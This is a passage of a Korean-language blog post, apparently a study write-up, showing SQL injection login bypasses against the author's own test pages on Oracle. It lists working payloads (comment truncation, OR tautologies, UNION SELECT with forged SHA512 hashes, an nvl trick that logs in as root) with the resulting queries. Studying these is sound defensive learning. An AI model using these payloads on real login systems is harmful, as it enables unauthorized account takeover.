      <td>VARCHAR(60)</td>
      <td>VARCHAR(60)</td>
      <td>VARCHAR(60)</td>
      <td>CHAR(128)</td>
    </tr>
  </tbody>
</table>

<ul>
  <li><strong>hashpwd</strong> 컬럼은 password를 해시(SHA512) 암호화를 한 것 이다.</li>
  <li>실제로 유저 정보를 저장하기 위한 테이블을 구성할 때는 해시 암호화된 비밀번호만 저장해야한다.</li>
</ul>

<p><br /><br /></p>
<h2 id="로그인-방식에-따른-sql-인젝션-공격방식">로그인 방식에 따른 sql 인젝션 공격방식</h2>
<ul>
  <li>식별
    <ul>
      <li>많은 데이터 중에서 특별한 데이터를 가려내는것.</li>
    </ul>
  </li>
  <li>인증
    <ul>
      <li>그 사람이 맞는지 확인하는 작업. ( 비밀번호 인증 )</li>
    </ul>
  </li>
</ul>

<h4 id="1-식별과-인증을-동시에-할-때">1. 식별과 인증을 동시에 할 때</h4>
<ul>
  <li>하나의 <code class="language-plaintext highlighter-rouge">sql 질의문</code> 으로 식별과 인증을 완료한다.</li>
</ul>

<blockquote>
  <p>로그인방법</p>
  <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">members</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'아이디'</span> <span class="k">and</span> <span class="n">PASSWORD</span><span class="o">=</span><span class="s1">'비번'</span>
</code></pre></div>  </div>
  <ul>
    <li><strong>아이디</strong>와 <strong>비밀번호</strong>를 동시에 일치하면 사용자 정보가 나온다. 이러한 정보가 나오면 로그인에 성공한 것이다.</li>
    <li>하지만 아무 정보도 안나오면 로그인에 실패 한 것이다.</li>
  </ul>
</blockquote>

<blockquote>
  <p>로그인 코드
<script src="https://gist.github.com/MinGyu2/348f7a0e850908a350bb766f307d8e9a.js"></script></p>
  <ul>
    <li>다음 코드를 통해 인증을 한다.
      <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">var</span> <span class="n">member</span> <span class="o">=</span> <span class="n">auth</span><span class="o">.</span><span class="na">authAndMember</span><span class="o">(</span><span class="n">id</span><span class="o">,</span> <span class="n">pwd</span><span class="o">);</span>
</code></pre></div>      </div>
    </li>
  </ul>
</blockquote>

<blockquote>
  <p>정상적인 로그인<br />
<img src="https://user-images.githubusercontent.com/31990118/232983137-92129ab9-a389-43c0-93b9-46e70de832ce.png" alt="Pasted image 20230419141436" /><br /><img src="https://user-images.githubusercontent.com/31990118/232983198-a896785d-032c-47a7-9dac-905c0a7fe3a8.png" alt="Pasted image 20230419141453" /></p>
</blockquote>

<p><br /></p>
<blockquote>
  <p><strong>공격 방법</strong></p>
</blockquote>

<ul>
  <li><strong>주석을 이용한 인증우회(1)</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2'--</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td>` `</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select * from members where id='user2'--' and PASSWORD=' '</code><br /><img src="https://user-images.githubusercontent.com/31990118/232983978-af5bd6a4-cc9b-4c5b-a130-155f58121b71.png" alt="Pasted image 20230419044643" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984069-0c3d894b-edfe-43c0-a4b2-04349fee4065.png" alt="Pasted image 20230419044620" /></li>
</ul>

<p><br /></p>
<ul>
  <li><strong>주석을 이용한 인증우회(2)</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">*/and '1'='1</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select * from members where id='user2'/*' and password='*/and '1'='1';</code><br /><img src="https://user-images.githubusercontent.com/31990118/232984619-32b03055-7784-4d7b-ad5e-15a7bf6f1dd8.png" alt="Pasted image 20230419141124" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984682-5b1c1f8e-bd5b-442c-a209-f732dcf21e26.png" alt="Pasted image 20230419141032" /></li>
  <li>블럭 단위로 주석처리 하였다.</li>
</ul>

<p><br /></p>
<ul>
  <li><strong>or 이용한 인증우회</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2' or '1'='1</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td>` `</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select * from members where id='user2' or '1'='1' and PASSWORD=' '</code><br /><img src="https://user-images.githubusercontent.com/31990118/232984798-75e83f27-fab3-4e09-b546-9f1bad9dff19.png" alt="Pasted image 20230419141300" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984846-083c960b-50c9-4344-b391-e4486fb22736.png" alt="Pasted image 20230419141331" /></li>
  <li>비교연산자 우선순위에 의해 and 연산자 부분을 먼저 계산을 하고 or 연산을 계산한다.<br /><code class="language-plaintext highlighter-rouge">select * from members where (id='user2' or ('1'='1' and PASSWORD=' '))</code></li>
</ul>

<p><br /><br /></p>
<h4 id="2-식별과-인증을-따로-할-때">2. 식별과 인증을 따로 할 때</h4>

<blockquote>
  <p>로그인방법</p>
  <ol>
    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='아이디' </code></li>
    <li>입력받은 비밀번호와 db 에서 불러온 비밀번호를 비교하여 일치하는지 확인한다.</li>
    <li>일치하면 db 에서 불러온 id 정보를 통해 나머지 유저 정보도 불러온다.<br /><code class="language-plaintext highlighter-rouge">select * from members  where id='db에서 불러온 id정보';</code></li>
  </ol>
</blockquote>

<blockquote>
  <p>로그인 코드<br /><script src="https://gist.github.com/MinGyu2/7714a6942bb2726177f0dcbfef5caaa7.js"></script></p>
</blockquote>

<blockquote>
  <p>정상적인 로그인<br />
<img src="https://user-images.githubusercontent.com/31990118/232985187-5a0d4782-8d8a-4f53-bdd6-c6e636026a14.png" alt="Pasted image 20230419141842" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985264-660444cd-f648-4933-8b3f-fb4b7d6e91c6.png" alt="Pasted image 20230419141903" /></p>
</blockquote>

<blockquote>
  <p>union을 이용한 우회 공격 전 정확한 <strong>컬럼 수</strong> 찾기</p>
  <ul>
    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/232985373-2f1890c3-e762-43ce-a675-28c7904f68ed.png" alt="Pasted image 20230419141937" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985437-96a4348c-56d8-4fe1-bd1c-9628a2324d0c.png" alt="Pasted image 20230419141951" /></li>
    <li><code class="language-plaintext highlighter-rouge">user2' order by 3 -- </code> 로그인 실패<br /><img src="https://user-images.githubusercontent.com/31990118/232985581-b986925c-674e-45f9-a0a3-2d13dedb546d.png" alt="Pasted image 20230419142020" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985629-99e7085d-df98-4268-b513-18ce477eb459.png" alt="Pasted image 20230419142050" /></li>
    <li>즉 컬럼의 수가 2개인 것을 확인할 수 있다.</li>
  </ul>
</blockquote>

<p><br /></p>
<blockquote>
  <p>공격 방법</p>
</blockquote>

<ul>
  <li><strong>union + 주석 사용</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual -- </code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','user2' from dual where '1'='1'</code><br /><img src="https://user-images.githubusercontent.com/31990118/232985841-7099d8b7-0441-4a9f-a001-5568d8614c67.png" alt="Pasted image 20230419142133" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985915-ea61d625-85cd-4bca-9e58-dd7836dc3101.png" alt="Pasted image 20230419142152" /></li>
</ul>

<p><br /></p>
<ul>
  <li><strong>union + where 사용</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual where '1'='1</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','user2' from dual where '1'='1'</code><br /><img src="https://user-images.githubusercontent.com/31990118/232986108-6e532e72-4254-4531-9464-ef82413d123f.png" alt="Pasted image 20230419142239" />
<br /><img src="https://user-images.githubusercontent.com/31990118/232986157-f68af392-ddb2-4a6b-829e-62e9ce649116.png" alt="Pasted image 20230419142252" /></li>
</ul>

<p><br /><br /></p>
<h4 id="3-식별과-인증을-동시에-할-때-hash-암호화된-비밀번호">3. 식별과 인증을 동시에 할 때(+ HASH 암호화된 비밀번호)</h4>
<ul>
  <li>웹서버는 사용자 사용하는 비밀번호를 HASH 암호화 하여 서버에 저장한다.</li>
</ul>

<blockquote>
  <p>로그인 방법</p>
  <ul>
    <li>하나의 <code class="language-plaintext highlighter-rouge">sql 질의문</code> 으로 식별과 인증을 완료한다는 것이다.
      <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">members</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'입력id'</span> <span class="k">and</span> <span class="n">hashpwd</span><span class="o">=</span><span class="n">standard_hash</span><span class="p">(</span><span class="s1">'입력 pwd'</span><span class="p">,</span><span class="s1">'SHA512'</span><span class="p">);</span>
</code></pre></div>      </div>
    </li>
    <li>웹 서버에서 pwd 를 바로 비교하는것이 아닌 <strong>SHA512</strong> 알고리즘으로 HASH 암호화한 값을 비교한다.</li>
    <li><strong>아이디</strong>와 <strong>비밀번호</strong>를 동시에 일치하면 유저 정보가 나온다. 이러한 정보가 나오면 로그인에 성공한 것이다.</li>
    <li>하지만 아무 정보도 안나오면 로그인에 실패 한 것이다.</li>
  </ul>
</blockquote>

<blockquote>
  <p>로그인 코드 <br />
<script src="https://gist.github.com/MinGyu2/10015945943d3c562131ca34225b8529.js"></script></p>
</blockquote>

<blockquote>
  <p>정상적인 로그인<br /><img src="https://user-images.githubusercontent.com/31990118/232986886-8bd775f2-b4ea-4d8f-81b5-1052e894f004.png" alt="Pasted image 20230419142438" />
<br /><img src="https://user-images.githubusercontent.com/31990118/232986977-ab3e49bb-012e-40a8-b726-725242bf5d8d.png" alt="Pasted image 20230419142455" /></p>
</blockquote>

<blockquote>
  <p>nvl 함수</p>
  <ul>
    <li>nvl 함수는 값이 null 인 경우 지정값을 출력하고 , 값이 null 아니면 그대로 출력한다.</li>
    <li>nvl(값,  지정값)</li>
    <li>‘1’ 은 null 이 아니다. 따라서 1이 출력된다.<br /><img src="https://user-images.githubusercontent.com/31990118/232987098-fed02520-2eab-4f8d-bf02-4e386a3d8166.png" alt="Pasted image 20230419143825" /></li>
  </ul>
</blockquote>

<p><br /></p>
<blockquote>
  <p>공격 방법</p>
</blockquote>

<ul>
  <li><strong>주석사용</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2' -- </code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td>` `</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id from members where id='user2' -- ' and hashpwd=standard_hash('ksdjfaklsf','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990015-656e3828-1f9c-44ac-aef5-404079e11f67.png" alt="Pasted image 20230419142553" />
<br /><img src="https://user-images.githubusercontent.com/31990118/232990061-98b4cd2b-84f9-4ffb-85f8-3398a26fe40d.png" alt="Pasted image 20230419142616" /></li>
</ul>

<p><br /><br /></p>
<ul>
  <li><strong>주석 + or + nvl사용</strong> (members 테이블의 가장 상위에 있는 root 로 로그인된다.)</li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">*/ or '1'=nvl('1</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id from members where id='user2'/*' and hashpwd=standard_hash('*/ or '1'=nvl('1','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990160-db93d3d4-95cc-4498-90b2-0d20d2a552df.png" alt="Pasted image 20230419142842" />
<br /><img src="https://user-images.githubusercontent.com/31990118/232990195-078251e2-8dec-4601-9bb3-b84fcd2eb24f.png" alt="Pasted image 20230419142857" /></li>
  <li>여기서 user2 사용자가 아닌 root로 로그인 된 것을 확인할 수 있다.</li>
  <li>서버에서 완성된 쿼리는 모든 사용자 정보를 불러오고 서버는 사용자 정보들 중 맨위에 존재하는 사용자의 정보를 가져와 보여준다.</li>
  <li>
    <p>테이블 맨위에는 root 사용자가 존재하여 root 계정으로 로그인된 것 이다.
<br /><br /></p>
  </li>
  <li><strong>주석 + and + nvl사용</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">*/ and '1'=nvl('1</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id from members where id='user2'/*' and hashpwd=standard_hash('*/ and '1'=nvl('1','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990461-99c1e174-9ff6-4b03-ad3c-a65c52e55953.png" alt="Pasted image 20230419144106" /><br /><img src="https://user-images.githubusercontent.com/31990118/232990496-9034bd9e-eb22-41a4-8351-925d908d97e8.png" alt="Pasted image 20230419144117" /></li>
</ul>

<p><br /><br /></p>
<ul>
  <li><strong>or 이용하기</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2' or '1'='1</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td>` `</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id from members where id='user2' or '1'='1' and hashpwd=standard_hash(' ','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990748-9179397a-d4e8-4f39-b657-bbbcf04faa9c.png" alt="Pasted image 20230419143137" /><br /><img src="https://user-images.githubusercontent.com/31990118/232990788-47801f8e-ce8b-453b-a9a3-b43bb8ba0b98.png" alt="Pasted image 20230419143153" /></li>
</ul>

<p><br /><br /></p>
<h4 id="4-식별과-인증을-따로-할-때-비밀번호-sha512-하여-table에-저장">4. 식별과 인증을 따로 할 때(+ 비밀번호 SHA512 하여 table에 저장)</h4>

<blockquote>
  <p>로그인 방법</p>
  <ol>
    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 해시로 저장된 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='아이디'</code></li>
    <li>유저가 입력한 비밀번호를 해시 암호화 알고리즘을 통해 암호화 한다.</li>
    <li>유저가 입력한 해시화 된 비밀번호와 db에서 불러온 해시화된 비밀번호를 비교한다.</li>
    <li>서로 일치하면 db 에서 불러온 <code class="language-plaintext highlighter-rouge">id</code> 정보를 이용하여 나머지 유저 정보도 불러온다.</li>
  </ol>
</blockquote>

<blockquote>
  <p>코드<br /><script src="https://gist.github.com/MinGyu2/3ba980c0793432ddb51eb184be586ff3.js"></script></p>
</blockquote>

<blockquote>
  <p>정상적인 로그인<br /><img src="https://user-images.githubusercontent.com/31990118/232991349-687a4c81-ef26-4c32-80b0-5bc5760cfecc.png" alt="Pasted image 20230419150421" />
<br /><img src="https://user-images.githubusercontent.com/31990118/232991402-b32657e8-1f6d-4feb-8c64-8ca1f3728d20.png" alt="Pasted image 20230419150437" /></p>
</blockquote>

<blockquote>
  <p>정확한 컬럼 수 찾기</p>
  <ul>
    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/232991510-58554a20-098d-4531-b5e1-f664afcb53b3.png" alt="Pasted image 20230419144418" /></li>
    <li>컬럼수가 2개라는 것을 알 수 있다.</li>
  </ul>
</blockquote>

<p><br /></p>
<blockquote>
  <p>공격방법</p>
</blockquote>

<ul>
  <li><strong>union 을 이용한다.</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual --</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='x' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual -- '</code><br /><img src="https://user-images.githubusercontent.com/31990118/233049085-c016daf8-8467-47ad-8d63-26668bfc33ac.png" alt="Pasted image 20230419145121" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233049124-051680f1-71c0-45d5-b569-ff429fa6581a.png" alt="Pasted image 20230419145133" /></li>
</ul>

<p><br /></p>
<ul>
  <li><strong>직접 해시 암호한 값을 넣어준다.</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', hash('a','SHA512') from dual --</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">a</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>hash(‘a’,’SHA512’) = <code class="language-plaintext highlighter-rouge">1F40FC92DA241694750979EE6CF582F2D5D7D28E18335DE05ABC54D0560E0F5302860C652BF08D560252AA5E74210546F369FBBBCE8C12CFC7957B2652FE9A75</code></li>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='2' union select 'user2', '1F40FC92DA241694750979EE6CF582F2D5D7D28E18335DE05ABC54D0560E0F5302860C652BF08D560252AA5E74210546F369FBBBCE8C12CFC7957B2652FE9A75' from dual --'</code><br /><img src="https://user-images.githubusercontent.com/31990118/233049465-179b0584-4be4-4702-a13a-e7ed0bb58b3c.png" alt="Pasted image 20230419145351" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233049512-f9fe88e5-5ccb-4863-89e5-be94b3eaef62.png" alt="Pasted image 20230419145407" /></li>
</ul>

<p><br /></p>

<ul>
  <li><strong>주석 없이 하기</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual where '1'='1 </code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>
    <p>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual where '1'='1'</code><br />
<img src="https://user-images.githubusercontent.com/31990118/233049659-a8d081d7-b534-4236-917d-9fa5306b7205.png" alt="Pasted image 20230419145543" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233049710-435711d1-158a-4f42-849a-ace70d6b1dcc.png" alt="Pasted image 20230419145554" /></p>
  </li>
  <li>standard_hash(‘user2’,’SHA512’) 로 나오는 결과와 table 에 저장된 hash 로 암호화 된 패스워드는 타입이 다르다.</li>
  <li>따라서 <strong>cast 함수</strong>를 이용하여 타입을 <strong>char(128)</strong> 로 변경하였다.</li>
</ul>

<p><br /><br /></p>

<h4 id="5-식별과-인증을-따로-할-때-id-두번-확인하기-">5. 식별과 인증을 따로 할 때(+ id 두번 확인하기 )</h4>

<blockquote>
  <p>로그인방법</p>
  <ol>
    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='아이디' and id='아이디'</code></li>
    <li>여기서 id를 두번 확인한 것을 알 수 있다.</li>
    <li>입력받은 비밀번호와 db 에서 불러온 비밀번호를 비교하여 일치하는지 확인한다.</li>
    <li>일치하면 db 에서 불러온 id 정보를 통해 나머지 유저 정보도 불러온다.<br /><code class="language-plaintext highlighter-rouge">select * from members  where id='db에서 불러온 id정보';</code></li>
  </ol>
</blockquote>

<blockquote>
  <p>로그인 코드<br />
<script src="https://gist.github.com/MinGyu2/4838aebdc75359591b92074aff22d9b9.js"></script></p>
</blockquote>

<blockquote>
  <p>정상적인 로그인<br />
<img src="https://user-images.githubusercontent.com/31990118/233050196-c0143052-3671-4b80-b093-26faa1a48362.png" alt="Pasted image 20230419150308" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233050247-58e103c1-83b5-4b53-bde1-bfff07bae2f4.png" alt="Pasted image 20230419150324" /></p>
</blockquote>

<p><br /></p>
<blockquote>
  <p>정확한 컬럼 수 찾기</p>
  <ul>
    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/233050601-910ace99-8195-40c5-a231-ef871db2e4ab.png" alt="Pasted image 20230419145849" /><br /><img src="https://user-images.githubusercontent.com/31990118/233050662-6455b018-b493-4f44-94fa-21555d6111c5.png" alt="Pasted image 20230419150003" /></li>
    <li><code class="language-plaintext highlighter-rouge">user2' order by 3 -- </code> 로그인 실패</li>
    <li>즉 컬럼의 수는 2개 라는것을 알 수 있다.</li>
  </ul>
</blockquote>

<p><br /></p>

<blockquote>
  <p>공격방법</p>
</blockquote>

<ul>
  <li><strong>union + 주석 사용</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','a' from dual -- </code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">a</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','a' from dual -- ' and id='x' union select 'user2','a' from dual -- '</code><br /><img src="https://user-images.githubusercontent.com/31990118/233051049-a26dfe1e-a888-412b-a552-54f56d8b4f06.png" alt="Pasted image 20230419150030" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233051097-c07becb0-6e56-458a-b33d-1401cea13e36.png" alt="Pasted image 20230419150041" /></li>
</ul>

<p><br /></p>

<blockquote>
  <p>특징</p>
  <ul>
    <li>id를 한번확인 하는 방법보다 2번 확인을 하면 공격자가 인증 쿼리 예측하기 힘들다.</li>
    <li><code class="language-plaintext highlighter-rouge">where</code> 문을 추가할 수 없다.<br />id에 다음 쿼리를 입력하여도 로그인이 안된다.<br /> <code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual where '1'='1</code></li>
  </ul>
</blockquote>

<p><br /><br /></p>
<h3 id="단방향-해시-함수">단방향 해시 함수</h3>
<hr />
<ul>
  <li>임이의 길이를 갖는 데이터를 고정된 길이의 데이터로 변환시켜주는 함수이다.</li>
  <li>위변조 여부를 판별하거나, 무결성을 검증하는데 사용된다.</li>
  <li>비밀번호를 서버에 안전하게 저장하기 위해 사용한다.</li>
  <li>MD5, SHA1, SHA256, SHA512 등이 있다.</li>
</ul>

<h3 id="sql--차이">SQL  차이</h3>
<hr />

<table>
  <thead>
    <tr>
      <th> </th>
      <th>mysql</th>
      <th>oracle db</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>한줄 주석</td>
      <td>#, –</td>
      <td>–</td>
    </tr>
    <tr>
      <td>부분 주석</td>
      <td>/**/</td>
      <td>/**/</td>
    </tr>
    <tr>
      <td>SHA512</td>
      <td>SHA2(‘A’,512)</td>
      <td>standard_hash(‘A’,’SHA512’ )</td>
    </tr>
    <tr>
      <td>더미 테이블</td>
      <td>select ‘a’, ‘b’</td>
      <td>select ‘a’,’b’ from dual</td>
    </tr>
  </tbody>
</table>

<p><br /><br /></p>

<h3 id="oracle-sql-연산자-우선순위">Oracle SQL 연산자 우선순위</h3>
<hr />

<table>
  <thead>
    <tr>
      <th>연산자</th>
      <th>설명</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>산술연산자</td>
      <td>** * , /, +, - **</td>
    </tr>
    <tr>
      <td>연결연산자</td>
      <td>||</td>
    </tr>
    <tr>
      <td>비교연산자</td>
      <td>=, &gt; , &lt; , &gt;= , &lt;= , &lt;&gt; , != , ^=</td>
    </tr>
    <tr>
      <td>논리연사자</td>
      <td>BETWEEN, NOT, AND, OR</td>
    </tr>
    <tr>
      <td>SQL 연산자</td>
      <td>LIKE, NOT LIKE, IN, EXISTS</td>
    </tr>
    <tr>
      <td>집합 연산자</td>
      <td>UNION ALL, UNION, INTERSECT, MINUS</td>
    </tr>
  </tbody>
</table>

<table>
  <thead>
    <tr>
      <th>순서</th>
      <th>연산자</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>괄호</td>
    </tr>
    <tr>
      <td>2</td>
      <td>* , /</td>
    </tr>
    <tr>
      <td>3</td>
      <td>+ , -</td>
    </tr>
    <tr>
      <td>4</td>
      <td>= , &lt;&gt; , &lt; , &gt; , &lt;= , &gt;=</td>
    </tr>
    <tr>
      <td>5</td>
      <td>IS (IS NULL, IS NOT NULL, IS EMPTY, IS NOT EMPTY)</td>
    </tr>
    <tr>
      <td>6</td>
      <td>BETWEEN</td>
    </tr>
    <tr>
      <td>7</td>
      <td>NOT</td>
    </tr>
    <tr>
      <td>8</td>
      <td>AND</td>
    </tr>
    <tr>
      <td>9</td>
      <td>OR</td>
    </tr>
  </tbody>
</table>

<h3 id="참고-사이트">참고 사이트</h3>
<hr />
<ul>
  <li><a href="https://graypastel.tistory.com/entry/ORACLE%EC%9D%98-%EC%97%B0%EC%82%B0%EC%9E%90-%EC%9A%B0%EC%84%A0%EC%88%9C%EC%9C%84">ORACLE의 연산자 우선순위 (tistory.com)</a></li>
  <li><a href="https://m.blog.naver.com/michael_cho77/221570607776">오라클 - 11. 오라클의 연산자우선순위 : 네이버 블로그 (naver.com)</a></li>
  <li><a href="https://docs.oracle.com/cd/E49933_01/server.770/es_eql/src/ceql_expr_precedence_rules.html">Operator precedence rules (oracle.com)</a></li>
  <li><a href="https://bamtory29.tistory.com/entry/MySQL-%EC%A3%BC%EC%84%9D">MySQL 주석 (tistory.com)</a></li>
  <li><a href="https://upbitcare.com/academy/education/blockchain/52">해시 함수는 무엇인가?</a></li>
  <li><a href="https://gent.tistory.com/189">오라클 NVL, NVL2 함수 사용방법 (null, 공백, 치환) (tistory.com)</a></li>
  <li><a href="https://learn.microsoft.com/ko-kr/sql/t-sql/data-types/data-type-conversion-database-engine?view=sql-server-ver16">데이터 형식 변환(데이터베이스 엔진) - SQL Server</a></li>
  <li><a href="https://hyejin.tistory.com/157">oracle 비교 함수 (DECODE(), LEAST(), GREATEST(), NVL(), WIDTH_BUCKET() )</a></li>
  <li><a href="https://stackoverflow.com/questions/2568469/storing-sha-512-hashes-in-mysql">php - Storing SHA-512 Hashes in MySQL - Stack Overflow</a></li>
  <li><a href="https://blog.jiniworld.me/93">MySQL Function 암호화 알고리즘(AES, MD5, SHA1, SHA2) (jiniworld.me)</a></li>
  <li><a href="https://atotw.tistory.com/24">Oracle STANDARD_HASH 설명 : 오라클 함수 (tistory.com)</a></li>
